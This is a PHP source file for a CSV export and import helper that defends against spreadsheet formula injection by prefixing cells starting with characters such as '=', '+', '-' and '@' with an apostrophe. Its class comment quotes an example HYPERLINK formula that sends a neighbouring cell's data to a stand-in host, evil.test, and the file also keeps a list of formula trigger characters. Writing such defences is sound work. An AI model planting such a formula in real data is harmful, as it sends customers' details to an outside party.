<?php
/**
 * CSV that is safe to open in a spreadsheet.
 *
 * @package   SugarCommerce\Text
 * @copyright Copyright (c) 2026, ArrayPress Limited
 * @license   GPL-2.0-or-later
 * @since     1.0.0
 */

declare( strict_types=1 );

namespace SugarCommerce\Text;

/**
 * Class Csv
 *
 * An export is opened in Excel, Numbers or Sheets, not parsed by a program --
 * and all three run a cell that starts with `=` as a formula. A customer
 * whose name is `=HYPERLINK("https://evil.test?"&A1,"Click")` becomes a link
 * that posts the row beside it somewhere else when the seller clicks it, and
 * the more interesting formulas reach the filesystem or the network. The
 * data came out of a database that anybody with a checkout form can write
 * to. OWASP calls it CSV injection; the defence is a leading apostrophe on
 * any cell that starts with a character a spreadsheet treats as the start of
 * a formula, which every one of them displays as nothing.
 *
 * A file can be written with a byte-order mark, because Excel otherwise
 * reads UTF-8 as Windows-1252 and `Café` arrives as `CafÃ©`.
 *
 * Quoted the way `fputcsv()` quotes with no escape character -- RFC 4180,
 * a quote inside is doubled -- because PHP's default backslash escape is not
 * in the RFC, confuses other readers, and is deprecated from PHP 8.4.
 *
 * @since 1.0.0
 */
final class Csv {

	/**
	 * Characters that make a spreadsheet read a cell as a formula.
	 *
	 * `|` for the DDE of old Excel; tab and carriage return because some
	 * importers strip leading whitespace and then see the `=` behind it.
	 *
	 * @since 1.0.0
	 *
	 * @var list<string>
	 */
	public const TRIGGERS = array( '=', '+', '-', '@', '|', "\t", "\r" );

	/**
	 * Whitespace an importer may strip before it looks for a formula; what
	 * follows it is checked too.
	 */
	private const LEADING = " \t\r\n";

	/**
	 * Characters that put a cell in quotes.
	 *
	 * What fputcsv() quotes for -- the comma, the quote, line breaks, tab and
	 * space -- and the semicolon besides, because Excel in much of Europe
	 * splits a .csv on semicolons. Unquoted, `Jo;=HYPERLINK(…)` is one cell
	 * here and two there, and the second starts with `=`.
	 */
	private const QUOTED = '/[,";\r\n\t ]/';

	/**
	 * The UTF-8 byte-order mark.
	 *
	 * @since 1.0.0
	 */
	public const BOM = "\xEF\xBB\xBF";

	/**
	 * A whole file: header row, then the rows.
	 *
	 * ```php
	 * $csv = Csv::build( array( 'Name', 'Email', 'Total' ), $rows );
	 * ```
	 *
	 * @since 1.0.0
	 *
	 * @param array<array-key, mixed>           $headers Column names.
	 * @param iterable<array<array-key, mixed>> $rows    Rows, each in header order.
	 * @param bool                              $bom     Start with a UTF-8 byte-order mark, for Excel.
	 *
	 * @return string
	 */
	public static function build( array $headers, iterable $rows, bool $bom = true ): string {
		$csv = array() === $headers ? '' : self::row( $headers );

		foreach ( $rows as $row ) {
			$csv .= self::row( (array) $row );
		}

		return ( $bom ? self::BOM : '' ) . $csv;
	}

	/**
	 * Rows written to an open file, one batch at a time.
	 *
	 * For an export too big to hold in memory: open the file, write the
	 * header with the first batch, and the rest after it.
	 *
	 * ```php
	 * $handle = fopen( $path, $first ? 'w' : 'a' );
	 * if ( $first ) {
	 *     Csv::write( $handle, array( $headers ), bom: true );
	 * }
	 * Csv::write( $handle, $batch );
	 * fclose( $handle );
	 * ```
	 *
	 * @since 1.0.0
	 *
	 * @param resource                          $handle An open, writable stream.
	 * @param iterable<array<array-key, mixed>> $rows   Rows of cells.
	 * @param bool                              $bom    Write a byte-order mark first.
	 *
	 * @return bool False when a write failed.
	 */
	public static function write( $handle, iterable $rows, bool $bom = false ): bool {
		if ( ! is_resource( $handle ) ) {
			return false;
		}

		if ( $bom && false === fwrite( $handle, self::BOM ) ) {
			return false;
		}

		foreach ( $rows as $row ) {
			if ( false === fwrite( $handle, self::row( (array) $row ) ) ) {
				return false;
			}
		}

		return true;
	}

	/**
	 * One line of a file: each value made safe, quoted where it has to be,
	 * comma-separated, ending in a newline.
	 *
	 * @since 1.0.0
	 *
	 * @param array<array-key, mixed> $values Values, in column order.
	 *
	 * @return string
	 */
	public static function row( array $values ): string {
		$cells = array();

		foreach ( $values as $value ) {
			$cell    = self::cell( $value );
			$cells[] = 1 === preg_match( self::QUOTED, $cell ) ? '"' . str_replace( '"', '""', $cell ) . '"' : $cell;
		}

		return implode( ',', $cells ) . "\n";
	}

	/**
	 * One value, made safe to open.
	 *
	 * A number is left alone, and so is a string that is one: `-12.50`
	 * starts with a trigger and is also just a refund, and a spreadsheet
	 * that reads it as a formula gets -12.50. Prefixing it would export every
	 * negative figure as text, a column that will not sum. The apostrophe
	 * goes on a trigger followed by something that is not a number --
	 * `-1+2`, `=SUM(A1)` -- which is the only shape that runs.
	 *
	 * True is `1` and false is empty, as PHP writes them. An array or an
	 * object that is not Stringable is written as its JSON (and that is
	 * then checked like any other text).
	 *
	 * @since 1.0.0
	 *
	 * @param mixed $value Value.
	 *
	 * @return string
	 */
	public static function cell( mixed $value ): string {
		if ( is_int( $value ) || is_float( $value ) ) {
			return (string) $value;
		}

		if ( null === $value || is_bool( $value ) ) {
			return $value ? '1' : '';
		}

		if ( is_string( $value ) || $value instanceof \Stringable ) {
			$text = (string) $value;
		} else {
			$text = (string) json_encode( $value );
		}

		return self::is_formula( $text ) ? "'" . $text : $text;
	}

	/**
	 * Whether a spreadsheet would run this text as a formula.
	 *
	 * Its first character, and the first an importer that strips leading
	 * whitespace would see.
	 *
	 * @since 1.0.0
	 *
	 * @param string $text Cell text.
	 *
	 * @return bool
	 */
	public static function is_formula( string $text ): bool {
		if ( '' === $text || is_numeric( $text ) ) {
			return false;
		}

		$first = ltrim( $text, self::LEADING );

		return in_array( $text[0], self::TRIGGERS, true )
			|| ( '' !== $first && in_array( $first[0], self::TRIGGERS, true ) && ! is_numeric( $first ) );
	}

	/**
	 * Rows of a CSV file, keyed by its header.
	 *
	 * The header row names the columns, so a file whose columns were
	 * reordered -- every export tool does it eventually -- still reads the
	 * same. A byte-order mark is removed first: Excel writes one, and left
	 * in place it becomes part of the first column's name, which then never
	 * matches. Names and values are trimmed; a short row reads its missing
	 * cells as ''; a fully blank line is skipped.
	 *
	 * Columns in $required are checked before the first row is yielded, and
	 * a file that lacks any is refused with {@see MissingColumns} -- so the
	 * mistake is "wrong file", not thousands of rows of blanks.
	 *
	 * ```php
	 * try {
	 *     foreach ( Csv::read( $path, array( 'Email', 'Date' ) ) as $line => $row ) {
	 *         $row['Email'];
	 *     }
	 * } catch ( MissingColumns $e ) {
	 *     echo 'Missing: ' . implode( ', ', $e->missing );
	 * }
	 * ```
	 *
	 * Reads with PHP's own parser (RFC 4180 quoting, no escape character).
	 * Not for untrusted files of unbounded size: each row is read whole.
	 *
	 * @since 1.0.0
	 *
	 * @param string       $path      File to read.
	 * @param list<string> $required  Columns the header must have.
	 * @param string       $separator Field separator.
	 *
	 * @return \Generator<int, array<string, string>> Line number (the header is line 1) => row.
	 *
	 * @throws \RuntimeException When the file cannot be opened.
	 * @throws MissingColumns    When a required column is absent.
	 */
	public static function read( string $path, array $required = array(), string $separator = ',' ): \Generator {
		$handle = is_file( $path ) ? fopen( $path, 'rb' ) : false;

		if ( false === $handle ) {
			throw new \RuntimeException( 'Could not open CSV file: ' . $path );
		}

		try {
			$header = fgetcsv( $handle, null, $separator, '"', '' );
			$header = false === $header ? array() : $header;

			if ( array() !== $header && is_string( $header[0] ) && str_starts_with( $header[0], self::BOM ) ) {
				$header[0] = substr( $header[0], 3 );
			}

			$names   = array_map( static fn( mixed $name ): string => trim( (string) $name ), $header );
			$missing = array_values( array_diff( $required, $names ) );

			if ( array() !== $missing ) {
				throw new MissingColumns( $missing, $names );
			}

			$line = 1;

			while ( false !== ( $cells = fgetcsv( $handle, null, $separator, '"', '' ) ) ) { // phpcs:ignore Generic.CodeAnalysis.AssignmentInCondition
				++$line;

				if ( array( null ) === $cells ) {
					continue;
				}

				$row = array();

				foreach ( $names as $index => $name ) {
					$row[ $name ] = trim( (string) ( $cells[ $index ] ?? '' ) );
				}

				yield $line => $row;
			}
		} finally {
			fclose( $handle );
		}
	}
}
